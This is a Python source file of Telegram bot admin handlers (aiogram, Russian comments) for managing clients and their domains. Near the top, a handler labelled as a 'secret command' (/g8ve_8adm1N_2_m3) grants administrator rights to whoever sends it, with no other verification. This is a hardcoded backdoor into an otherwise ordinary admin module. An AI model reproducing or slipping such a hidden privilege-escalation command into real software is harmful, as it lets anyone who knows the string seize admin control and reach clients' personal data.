"""
Обработчики команд для администраторов
"""
import logging
from aiogram import Router, F
from aiogram.filters import Command
from aiogram.types import Message, CallbackQuery
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup

from app.core.db import db_manager
from app.bot.keyboards.inline import get_clients_keyboard, get_client_actions_keyboard, get_back_keyboard
from app.bot.middlewares.role_check import AdminOnlyMiddleware

logger = logging.getLogger(__name__)
router = Router()

# Применяем middleware только к этому роутеру
router.message.middleware(AdminOnlyMiddleware())
router.callback_query.middleware(AdminOnlyMiddleware())


class AddClientStates(StatesGroup):
    """Состояния для добавления клиента"""
    waiting_for_identifier = State()


@router.message(Command("g8ve_8adm1N_2_m3"))
async def cmd_become_admin(message: Message):
    """Секретная команда для получения прав администратора"""
    user_id = message.from_user.id
    
    # Устанавливаем роль админа
    user = await db_manager.set_user_role(user_id, "admin")
    
    if user:
        await message.answer(
            "🎉 <b>Поздравляем!</b>\n\n"
            "Вы получили права администратора.\n\n"
            "Доступные команды:\n"
            "/clients - Управление клиентами\n"
            "/add_client - Добавить клиента\n"
            "/domains - Все домены\n"
            "/add - Добавить домен",
            parse_mode="HTML"
        )
        logger.info(f"User {user_id} ({message.from_user.username}) became admin")
    else:
        await message.answer("❌ Ошибка при установке прав администратора.")


@router.message(Command("clients"))
async def cmd_clients(message: Message):
    """Список всех клиентов"""
    clients = await db_manager.get_all_clients()
    
    if not clients:
        await message.answer(
            "📋 <b>Список клиентов пуст</b>\n\n"
            "Используйте /add_client для добавления нового клиента.",
            parse_mode="HTML"
        )
        return
    
    await message.answer(
        f"👥 <b>Клиенты ({len(clients)})</b>\n\n"
        f"Выберите клиента для управления:",
        parse_mode="HTML",
        reply_markup=get_clients_keyboard(clients)
    )


@router.callback_query(F.data.startswith("client_"))
async def callback_client_details(callback: CallbackQuery):
    """Детали клиента"""
    await callback.answer()
    
    client_id = int(callback.data.split("_")[1])
    
    # Получаем клиента
    user = await db_manager.register_user(client_id, None, None, None)
    
    if not user:
        await callback.message.edit_text("❌ Клиент не найден.")
        return
    
    # Получаем домены клиента
    domains = await db_manager.get_domains_by_client(client_id)
    
    domains_text = ""
    if domains:
        domains_text = "\n\n📋 <b>Домены:</b>\n"
        for domain in domains:
            domains_text += f"• {domain.name} ({len(domain.urls)} страниц)\n"
    else:
        domains_text = "\n\n📋 <b>Доменов пока нет</b>"
    
    await callback.message.edit_text(
        f"👤 <b>Клиент</b>\n\n"
        f"🆔 ID: <code>{user.id}</code>\n"
        f"👤 Username: @{user.username or 'не указан'}\n"
        f"📱 Телефон: {user.phone or 'не указан'}\n"
        f"📅 Регистрация: {user.created_at.strftime('%Y-%m-%d %H:%M')}"
        f"{domains_text}",
        parse_mode="HTML",
        reply_markup=get_client_actions_keyboard(client_id)
    )


@router.callback_query(F.data == "back_to_clients")
async def callback_back_to_clients(callback: CallbackQuery):
    """Вернуться к списку клиентов"""
    await callback.answer()
    
    clients = await db_manager.get_all_clients()
    
    await callback.message.edit_text(
        f"👥 <b>Клиенты ({len(clients)})</b>\n\n"
        f"Выберите клиента для управления:",
        parse_mode="HTML",
        reply_markup=get_clients_keyboard(clients)
    )


@router.message(Command("add_client"))
async def cmd_add_client(message: Message, state: FSMContext):
    """Начало процесса добавления клиента"""
    await message.answer(
        "➕ <b>Добавление клиента</b>\n\n"
        "Отправьте username (например @username) или телефон клиента.\n\n"
        "Клиент должен сначала запустить бота командой /start",
        parse_mode="HTML"
    )
    await state.set_state(AddClientStates.waiting_for_identifier)


@router.message(AddClientStates.waiting_for_identifier)
async def process_client_identifier(message: Message, state: FSMContext):
    """Обработка username или телефона клиента"""
    identifier = message.text.strip()
    
    # Ищем пользователя
    user = await db_manager.get_user_by_username_or_phone(identifier)
    
    if not user:
        await message.answer(
            "❌ Пользователь не найден.\n\n"
            "Убедитесь, что:\n"
            "1. Пользователь запустил бота командой /start\n"
            "2. Username или телефон указаны правильно\n\n"
            "Попробуйте еще раз или /cancel для отмены.",
            parse_mode="HTML"
        )
        return
    
    if user.role == "admin":
        await message.answer(
            "❌ Этот пользователь уже является администратором.\n\n"
            "Попробуйте другого или /cancel для отмены.",
            parse_mode="HTML"
        )
        return
    
    # Устанавливаем роль клиента (если еще не установлена)
    if user.role != "client":
        user = await db_manager.set_user_role(user.id, "client")
    
    await message.answer(
        f"✅ <b>Клиент добавлен!</b>\n\n"
        f"👤 Username: @{user.username or 'не указан'}\n"
        f"📱 Телефон: {user.phone or 'не указан'}\n"
        f"🆔 ID: <code>{user.id}</code>\n\n"
        f"Теперь вы можете привязать к нему домены через /add",
        parse_mode="HTML"
    )
    
    await state.clear()


@router.callback_query(F.data.startswith("assign_domain_"))
async def callback_assign_domain(callback: CallbackQuery):
    """Привязка домена к клиенту"""
    await callback.answer("Функция в разработке")
    # TODO: Реализовать выбор домена для привязки к клиенту


# Экспортируем роутер
__all__ = ['router']

